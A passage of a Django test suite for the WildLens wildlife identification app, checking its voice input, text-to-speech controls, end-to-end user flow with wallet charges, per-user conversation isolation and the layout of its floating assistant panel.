        self.assertIn("chatInput.value = baseInputText.trim() + ' ' + cleanFinal", html)

        # Must not have auto submit on recognition end/result
        self.assertNotIn("recognition.onresult = function(event) { chatForm.submit();", html)
        self.assertNotIn("recognition.onend = function() { submitInquiry(", html)

    def test_privacy_guarantees_no_audio_backend_storage(self):
        """Verify no audio files or raw voice streams are uploaded or stored in SQLite."""
        # Inspect WildlifeMessage fields
        field_names = [f.name for f in WildlifeMessage._meta.get_fields()]
        self.assertNotIn("audio", field_names)
        self.assertNotIn("recording", field_names)
        self.assertNotIn("voice_file", field_names)

        # Inspect AnimalPrediction fields
        pred_fields = [f.name for f in AnimalPrediction._meta.get_fields()]
        self.assertNotIn("audio", pred_fields)
        self.assertNotIn("voice_memo", pred_fields)

    def test_strict_phase_4_no_text_to_speech(self):
        """Verify no paid external or backend TTS services (e.g. ElevenLabs, AWS Polly) are used."""
        res = self.client.get(reverse("prediction_detail", kwargs={"prediction_id": self.prediction.id}))
        html = res.content.decode("utf-8")

        self.assertNotIn("elevenlabs", html.lower())
        self.assertNotIn("aws.polly", html.lower())
        self.assertNotIn("google.cloud.texttospeech", html.lower())
        self.assertNotIn("/api/tts/", html.lower())


# ===========================================================================
# 16. Phase 5 — AI Text-to-Speech Playback Tests
# ===========================================================================

class Phase5TextToSpeechTests(TestCase):
    def setUp(self):
        self.client = Client()
        self.user = User.objects.create_user(
            username="tts_tester",
            email="ttstester@wildlens.org",
            password="StrongPassword123!"
        )
        self.client.login(username="tts_tester", password="StrongPassword123!")
        self.profile, _ = Profile.objects.get_or_create(user=self.user)
        self.profile.wallet_balance = Decimal("10.00")
        self.profile.save()

        self.prediction = AnimalPrediction.objects.create(
            user=self.user,
            common_name="Indian Leopard",
            scientific_name="Panthera pardus fusca",
            identification_status="identified",
            identification_notes="Large spotted cat with rosette markings.",
            visual_clues=["Rosette spots", "Golden-yellow coat", "Muscular build"],
            wildlife_information="### 1. Species Overview\nSolitary and adaptable carnivore.",
            source_references=[{"title": "WII", "url": "https://wii.gov.in", "source": "WII"}]
        )
        self.conversation = WildlifeConversation.objects.create(
            user=self.user,
            prediction=self.prediction,
            title="Indian Leopard TTS Chat"
        )
        self.assistant_message = WildlifeMessage.objects.create(
            conversation=self.conversation,
            role="assistant",
            content="### Indian Leopard Profile\nIndian leopards feed on small-to-medium wild ungulates like chital and sambar."
        )

    def test_speech_synthesis_web_api_elements_and_toolbar(self):
        """Verify audio settings toolbar, auto-read toggle, speed selector, and global stop button."""
        res = self.client.get(reverse("prediction_detail", kwargs={"prediction_id": self.prediction.id}))
        self.assertEqual(res.status_code, 200)
        html = res.content.decode("utf-8")

        # Audio settings toolbar
        self.assertIn("chat-audio-toolbar", html)
        self.assertIn('id="auto-read-toggle"', html)
        self.assertIn("Auto-Read", html)

        # Speed selector with 0.75x, 1.0x, 1.25x, 1.5x
        self.assertIn('id="tts-speed-select"', html)
        self.assertIn('value="0.75"', html)
        self.assertIn('value="1"', html)
        self.assertIn('value="1.25"', html)
        self.assertIn('value="1.5"', html)

        # Global stop button
        self.assertIn('id="global-tts-stop-btn"', html)

    def test_message_speech_controls_rendered(self):
        """Verify assistant message bubbles contain Play, Pause, Stop, Replay, and speaking badge."""
        res = self.client.get(reverse("prediction_detail", kwargs={"prediction_id": self.prediction.id}))
        self.assertEqual(res.status_code, 200)
        html = res.content.decode("utf-8")

        # Play, Pause, Stop, Replay buttons
        self.assertIn("btn-msg-play", html)
        self.assertIn("bi bi-play-fill", html)
        self.assertIn("btn-msg-pause", html)
        self.assertIn("bi bi-pause-fill", html)
        self.assertIn("btn-msg-stop", html)
        self.assertIn("bi bi-stop-fill", html)
        self.assertIn("btn-msg-replay", html)
        self.assertIn("bi bi-arrow-clockwise", html)

        # Speaking indicator
        self.assertIn("tts-speaking-indicator", html)
        self.assertIn("bi bi-volume-up", html)

    def test_clean_text_extraction_logic_in_script(self):
        """Verify script cleans markdown symbols, URLs, and metadata before speech synthesis."""
        res = self.client.get(reverse("prediction_detail", kwargs={"prediction_id": self.prediction.id}))
        self.assertEqual(res.status_code, 200)
        html = res.content.decode("utf-8")

        self.assertIn("function extractCleanSpokenText(", html)
        # Markdown symbol stripping regexes
        self.assertIn("text.replace(/^#{1,6}\\s+/gm, '')", html)
        self.assertIn("text.replace(/\\*\\*([^*]+)\\*\\*/g, '$1')", html)
        self.assertIn("text.replace(/\\[([^\\]]+)\\]\\([^)]+\\)/g, '$1')", html)
        self.assertIn("text.replace(/https?:\\/\\/[^\\s]+/gi, '')", html)

    def test_reusable_controller_and_chunking_script(self):
        """Verify centralized ttsController, sentence chunking, and Hindi/English voice selection."""
        res = self.client.get(reverse("prediction_detail", kwargs={"prediction_id": self.prediction.id}))
        self.assertEqual(res.status_code, 200)
        html = res.content.decode("utf-8")

        self.assertIn("const ttsController = {", html)
        self.assertIn("function splitIntoSentences(", html)
        self.assertIn("function selectTTSVoice(", html)
        self.assertIn("window.speechSynthesis.getVoices()", html)
        self.assertIn("onvoiceschanged", html)
        self.assertIn("hi-IN", html)
        self.assertIn("en-IN", html)

    def test_playback_actions_pause_resume_stop_replay(self):
        """Verify speech controller supports pause, resume, stop, and replay actions."""
        res = self.client.get(reverse("prediction_detail", kwargs={"prediction_id": self.prediction.id}))
        self.assertEqual(res.status_code, 200)
        html = res.content.decode("utf-8")

        self.assertIn("pause() {", html)
        self.assertIn("window.speechSynthesis.pause()", html)
        self.assertIn("resume() {", html)
        self.assertIn("window.speechSynthesis.resume()", html)
        self.assertIn("stop() {", html)
        self.assertIn("window.speechSynthesis.cancel()", html)
        self.assertIn("replay() {", html)

    def test_auto_read_feature_in_script(self):
        """Verify auto-read invokes ttsController.play only when the toggle is enabled."""
        res = self.client.get(reverse("prediction_detail", kwargs={"prediction_id": self.prediction.id}))
        self.assertEqual(res.status_code, 200)
        html = res.content.decode("utf-8")

        # Auto-read toggle is not checked by default
        self.assertIn('id="auto-read-toggle"', html)
        self.assertNotIn('id="auto-read-toggle" checked', html)

        # Trigger logic in submitInquiry
        self.assertIn("if (autoReadToggle && autoReadToggle.checked && newBubble)", html)
        self.assertIn("ttsController.play(newBubble);", html)

    def test_coordination_between_microphone_and_speaker(self):
        """Verify starting microphone stops TTS, and starting TTS stops speech recognition."""
        res = self.client.get(reverse("prediction_detail", kwargs={"prediction_id": self.prediction.id}))
        self.assertEqual(res.status_code, 200)
        html = res.content.decode("utf-8")

        # In mic click: stops TTS
        self.assertIn("ttsController.stop();", html)
        # In TTS play: stops microphone listening
        self.assertIn("if (typeof stopListening === 'function') {", html)
        self.assertIn("stopListening();", html)

    def test_dynamic_assistant_bubble_includes_tts_actions(self):
        """Verify client-side appendAssistantBubble binds speech actions to new messages."""
        res = self.client.get(reverse("prediction_detail", kwargs={"prediction_id": self.prediction.id}))
        self.assertEqual(res.status_code, 200)
        html = res.content.decode("utf-8")

        self.assertIn("bindTTSActions(wrapper);", html)
        self.assertIn("bindTTSActions(chatThread);", html)


    def test_existing_chat_functionality_preserved_with_voice(self):
        """Verify standard text messaging and AJAX endpoint continue to work smoothly."""
        with patch("animal.views.run_wildlife_agent") as mock_agent:
            mock_agent.return_value = {
                "messages": [
                    AIMessage(content="Bengal tigers are primarily found in India, Bangladesh, Nepal, and Bhutan.")
                ],
                "final_result": {
                    "source_references": [
                        {"title": "IUCN", "url": "https://iucn.org", "source": "IUCN"}
                    ]
                }
            }

            res = self.client.post(
                reverse("assistant_chat"),
                data=json.dumps({
                    "conversation_id": self.conversation.id,
                    "message": "Where are Bengal tigers found geographically?"
                }),
                content_type="application/json"
            )
            self.assertEqual(res.status_code, 200)
            data = res.json()
            self.assertTrue(data["success"])
            self.assertIn("Bengal tigers are primarily found", data["answer"])
            self.assertEqual(WildlifeMessage.objects.filter(conversation=self.conversation).count(), 3)


# ===========================================================================
# 17. Phase 6 — Full Integration, User Flow, and Security Tests
# ===========================================================================

class Phase6FullUserFlowIntegrationTests(TestCase):
    def setUp(self):
        self.client = Client()
        self.username = "end_to_end_user"
        self.password = "StrongPassword123!"
        self.user = User.objects.create_user(
            username=self.username,
            email="e2e@wildlens.org",
            password=self.password
        )
        self.profile, _ = Profile.objects.get_or_create(user=self.user)
        self.profile.wallet_balance = Decimal("5.00")
        self.profile.save()

        # Other user for isolation tests
        self.other_user = User.objects.create_user(
            username="intruder_user",
            email="intruder@wildlens.org",
            password="StrongPassword123!"
        )

    def test_complete_end_to_end_user_journey(self):
        """
        Test the entire user journey:
        Login -> Upload -> Identification -> Dossier & Sticky Assistant ->
        Type Question -> Assistant Answer -> Voice & TTS Controls ->
        History View -> Reopen Conversation -> Historical TTS.
        """
        # 1. Login
        logged_in = self.client.login(username=self.username, password=self.password)
        self.assertTrue(logged_in)

        # 2. Upload image and mock LangGraph Vision + Information Node
        from io import BytesIO
        from PIL import Image
        from django.core.files.uploadedfile import SimpleUploadedFile

        img_io = BytesIO()
        pil_img = Image.new("RGB", (100, 100), color="orange")
        pil_img.save(img_io, format="JPEG")
        test_file = SimpleUploadedFile("tiger_sample.jpg", img_io.getvalue(), content_type="image/jpeg")

        with patch("animal.views.run_wildlife_agent") as mock_agent:
            mock_agent.return_value = {
                "request_type": "vision",
                "final_result": {
                    "common_name": "Royal Bengal Tiger",
                    "scientific_name": "Panthera tigris tigris",
                    "identification_status": "identified",
                    "identification_notes": "Identified by prominent black stripes and deep orange coat.",
                    "visual_clues": ["Black vertical stripes", "Deep orange coat", "White belly"],
                    "alternative_species": ["Indochinese Tiger"],
                    "wildlife_information": "### 1. Species Overview\nThe Bengal tiger is the national animal of India.",
                    "source_references": [
                        {"title": "WWF India", "url": "https://www.wwfindia.org", "source": "WWF"}
                    ],
                    "is_animal": True
                },
                "messages": [AIMessage(content="### 1. Species Overview\nThe Bengal tiger is the national animal of India.")],
                "tool_call_count": 2
            }

            res = self.client.post(
                reverse("predict"),
                data={"image": test_file, "request_id": str(uuid.uuid4())},
                follow=True
            )
            self.assertEqual(res.status_code, 200)

        # Verify wallet credit deduction
        self.profile.refresh_from_db()
        self.assertEqual(self.profile.wallet_balance, Decimal("4.00"))

        # Verify prediction record created
        prediction = AnimalPrediction.objects.filter(user=self.user).first()
        self.assertIsNotNone(prediction)
        self.assertEqual(prediction.common_name, "Royal Bengal Tiger")

        # 3. View Prediction Detail & Assistant Page
        detail_res = self.client.get(reverse("prediction_detail", kwargs={"prediction_id": prediction.id}))
        self.assertEqual(detail_res.status_code, 200)
        detail_html = detail_res.content.decode("utf-8")

        # Verify animal summary, dossier, sticky assistant, mic button, and tts controls
        self.assertIn("Royal Bengal Tiger", detail_html)
        self.assertIn("Grounded Wildlife Dossier", detail_html)
        self.assertIn("sticky-assistant-panel", detail_html)
        self.assertIn("chat-mic-btn", detail_html)
        self.assertIn("chat-audio-toolbar", detail_html)
        self.assertIn("auto-read-toggle", detail_html)
        self.assertIn("tts-speed-select", detail_html)
        self.assertIn("btn-msg-play", detail_html)

        # 4. Ask a follow-up question via Assistant Chat (AJAX)
        conversation = WildlifeConversation.objects.filter(user=self.user, prediction=prediction).first()
        self.assertIsNotNone(conversation)

        with patch("animal.views.run_wildlife_agent") as mock_agent:
            mock_agent.return_value = {
                "messages": [
                    AIMessage(content="Bengal tigers primarily prey on deer, wild boar, and water buffalo.")
                ],
                "final_result": {
                    "source_references": [
                        {"title": "IUCN Red List", "url": "https://iucnredlist.org", "source": "IUCN"}
                    ]
                }
            }

            chat_res = self.client.post(
                reverse("assistant_chat"),
                data=json.dumps({
                    "conversation_id": conversation.id,
                    "message": "What is the primary prey of this tiger?"
                }),
                content_type="application/json"
            )
            self.assertEqual(chat_res.status_code, 200)
            chat_data = chat_res.json()
            self.assertTrue(chat_data["success"])
            self.assertIn("primarily prey on deer", chat_data["answer"])

        # Verify follow-up chat is FREE (balance remains 4.00)
        self.profile.refresh_from_db()
        self.assertEqual(self.profile.wallet_balance, Decimal("4.00"))

        # Verify messages in SQLite
        msgs = WildlifeMessage.objects.filter(conversation=conversation).order_by("created_at")
        self.assertGreaterEqual(msgs.count(), 3)  # Initial info + user question + assistant answer

        # 5. Prediction History
        hist_res = self.client.get(reverse("history"))
        self.assertEqual(hist_res.status_code, 200)
        hist_html = hist_res.content.decode("utf-8")
        self.assertIn("Royal Bengal Tiger", hist_html)

        # 6. Reopen conversation and verify historical messages and speech playback buttons
        reopen_res = self.client.get(reverse("prediction_detail", kwargs={"prediction_id": prediction.id}))
        self.assertEqual(reopen_res.status_code, 200)
        reopen_html = reopen_res.content.decode("utf-8")
        self.assertIn("What is the primary prey of this tiger?", reopen_html)
        self.assertIn("primarily prey on deer", reopen_html)
        self.assertIn("btn-msg-play", reopen_html)

    def test_user_data_isolation_security(self):
        """Verify users cannot view or post messages to another user's conversation."""
        # Create prediction for primary user
        pred = AnimalPrediction.objects.create(
            user=self.user,
            common_name="Asiatic Lion",
            scientific_name="Panthera leo leo"
        )
        conv = WildlifeConversation.objects.create(
            user=self.user,
            prediction=pred,
            title="Lion Chat"
        )

        # Login as intruder user
        self.client.login(username="intruder_user", password="StrongPassword123!")

        # Intruder attempts to view prediction detail -> 404
        res = self.client.get(reverse("prediction_detail", kwargs={"prediction_id": pred.id}))
        self.assertEqual(res.status_code, 404)

        # Intruder attempts to chat in another user's conversation -> 404
        chat_res = self.client.post(
            reverse("assistant_chat"),
            data=json.dumps({"conversation_id": conv.id, "message": "Can I spy on this?"}),
            content_type="application/json"
        )
        self.assertEqual(chat_res.status_code, 404)

    def test_unauthenticated_access_redirects_to_login(self):
        """Verify unauthenticated requests to protected endpoints redirect to login."""
        self.client.logout()

        for url_name in ["predict", "history"]:
            res = self.client.get(reverse(url_name))
            self.assertEqual(res.status_code, 302)
            self.assertIn("/login", res.url)


# ===========================================================================
# 18. Phase 1 — Floating, Draggable, Resizable WildLens Assistant Tests
# ===========================================================================

class Phase1FloatingDraggableAssistantTests(TestCase):
    def setUp(self):
        self.client = Client()
        self.user = User.objects.create_user(
            username="floating_tester",
            email="floating@wildlens.org",
            password="StrongPassword123!"
        )
        self.client.login(username="floating_tester", password="StrongPassword123!")
        self.profile, _ = Profile.objects.get_or_create(user=self.user)
        self.profile.wallet_balance = Decimal("10.00")
        self.profile.save()

        self.prediction = AnimalPrediction.objects.create(
            user=self.user,
            common_name="Snow Leopard",
            scientific_name="Panthera uncia",
            identification_status="identified",
            identification_notes="Large cat native to the mountain ranges of Central and South Asia.",
            visual_clues=["Thick smoky-gray coat", "Dark rosettes", "Long bushy tail"],
            wildlife_information="### 1. Species Overview\nSolitary master of the high mountains.",
            source_references=[{"title": "Snow Leopard Trust", "url": "https://snowleopard.org", "source": "SLT"}]
        )
        self.conversation = WildlifeConversation.objects.create(
            user=self.user,
            prediction=self.prediction,
            title="Snow Leopard Chat"
        )
        self.assistant_message = WildlifeMessage.objects.create(
            conversation=self.conversation,
            role="assistant",
            content="Snow leopards inhabit steep, rugged terrain in alpine and subalpine zones."
        )

    def test_interact_js_script_and_static_assets(self):
        """Verify interact.min.js is served and loaded in the template."""
        res = self.client.get(reverse("prediction_detail", kwargs={"prediction_id": self.prediction.id}))
        self.assertEqual(res.status_code, 200)
        html = res.content.decode("utf-8")

        self.assertIn("interact.min.js", html)
        self.assertIn('<script src="/static/js/interact.min.js"></script>', html)

    def test_header_drag_handle_and_window_controls(self):
        """Verify header drag handle and dock/minimize/maximize/reset window controls."""
        res = self.client.get(reverse("prediction_detail", kwargs={"prediction_id": self.prediction.id}))
        self.assertEqual(res.status_code, 200)
        html = res.content.decode("utf-8")

        # Header drag elements
        self.assertIn("chat-header-drag", html)
        self.assertIn("chat-drag-indicator", html)

        # Window controls
        self.assertIn('id="assistant-window-actions"', html)
        self.assertIn('id="btn-assistant-dock"', html)
        self.assertIn("bi bi-box-arrow-up-right", html)
        self.assertIn('id="btn-assistant-minimize"', html)
        self.assertIn("bi bi-dash-lg", html)
        self.assertIn('id="btn-assistant-maximize"', html)
        self.assertIn("bi bi-arrows-fullscreen", html)
        self.assertIn('id="btn-assistant-reset"', html)
        self.assertIn("bi bi-arrow-counterclockwise", html)

    def test_resize_handle_and_minimized_launcher(self):
        """Verify resize handle in container and desktop minimized launcher button."""
        res = self.client.get(reverse("prediction_detail", kwargs={"prediction_id": self.prediction.id}))
        self.assertEqual(res.status_code, 200)
        html = res.content.decode("utf-8")

        # Resize handle
        self.assertIn('id="chat-resize-handle"', html)
        self.assertIn("chat-resize-handle", html)
        self.assertIn("bi bi-arrows-angle-expand", html)

        # Desktop minimized launcher
        self.assertIn('id="assistant-minimized-launcher"', html)
        self.assertIn("assistant-minimized-launcher", html)
        self.assertIn('id="desktop-minimized-badge"', html)

    def test_layout_manager_script_and_localStorage_logic(self):
        """Verify layoutManager object, localStorage preference key, and interact bindings."""
        res = self.client.get(reverse("prediction_detail", kwargs={"prediction_id": self.prediction.id}))
        self.assertEqual(res.status_code, 200)
        html = res.content.decode("utf-8")

        self.assertIn("const layoutManager = {", html)
        self.assertIn("const PREFS_KEY = 'wildlens_assistant_prefs';", html)
        self.assertIn("localStorage.getItem(PREFS_KEY)", html)
        self.assertIn("localStorage.setItem(PREFS_KEY", html)
        self.assertIn("window.interact(this.panel)", html)
        self.assertIn("allowFrom: '.chat-header-drag'", html)
        self.assertIn("restrictRect", html)
        self.assertIn("restrictSize", html)
        self.assertIn("clampBounds()", html)

    def test_dock_float_minimize_maximize_modes_in_script(self):
        """Verify modal states handling: docked, floating, maximized, and minimized."""
        res = self.client.get(reverse("prediction_detail", kwargs={"prediction_id": self.prediction.id}))
        self.assertEqual(res.status_code, 200)
        html = res.content.decode("utf-8")

        self.assertIn("setMode(mode", html)
        self.assertIn("mode-docked", html)
        self.assertIn("mode-floating", html)
        self.assertIn("mode-maximized", html)
        self.assertIn("mode-minimized", html)
        self.assertIn("resetLayout()", html)
        self.assertIn("restoreFromMinimized()", html)

    def test_mobile_responsive_launcher_and_offcanvas(self):
        """Verify mobile offcanvas drawer and mobile launcher are preserved."""
        res = self.client.get(reverse("prediction_detail", kwargs={"prediction_id": self.prediction.id}))
        self.assertEqual(res.status_code, 200)
        html = res.content.decode("utf-8")

        self.assertIn("mobile-assistant-launcher", html)
        self.assertIn("d-lg-none", html)
        self.assertIn("d-none d-lg-flex", html)
        self.assertIn("offcanvas-lg", html)

    def test_no_sensitive_data_in_localstorage_logic(self):
        """Verify preferences logic strictly isolates layout metrics from conversation content."""
        res = self.client.get(reverse("prediction_detail", kwargs={"prediction_id": self.prediction.id}))
        self.assertEqual(res.status_code, 200)
        html = res.content.decode("utf-8")

        # Must only serialize layout metadata
        self.assertIn("const dataToSave = {", html)
        self.assertIn("mode: this.state.mode", html)
        self.assertIn("x: this.state.x", html)
        self.assertIn("y: this.state.y", html)
        self.assertIn("width: this.state.width", html)
        self.assertIn("height: this.state.height", html)
        self.assertNotIn("message: chatInput", html)
        self.assertNotIn("history: conversation_messages", html)

    def test_voice_tts_and_chat_persistence_preserved_with_layout_manager(self):
        """Verify voice mic input, TTS playback, and AJAX chat remain fully intact."""
        with patch("animal.views.run_wildlife_agent") as mock_agent:
            mock_agent.return_value = {
                "messages": [
                    AIMessage(content="Snow leopards have dense fur and wide paws acting as natural snowshoes.")
                ],
                "final_result": {
                    "source_references": [
                        {"title": "SLT", "url": "https://snowleopard.org", "source": "SLT"}
                    ]
                }
            }

            res = self.client.post(
                reverse("assistant_chat"),
                data=json.dumps({
                    "conversation_id": self.conversation.id,
                    "message": "What adaptations help snow leopards in the cold?"
                }),
                content_type="application/json"
            )
            self.assertEqual(res.status_code, 200)
            data = res.json()
            self.assertTrue(data["success"])
            self.assertIn("natural snowshoes", data["answer"])

            # Verify voice & TTS elements still render
            get_res = self.client.get(reverse("prediction_detail", kwargs={"prediction_id": self.prediction.id}))
            get_html = get_res.content.decode("utf-8")
            self.assertIn('id="chat-mic-btn"', get_html)
            self.assertIn("ttsController", get_html)
            self.assertIn("btn-msg-play", get_html)







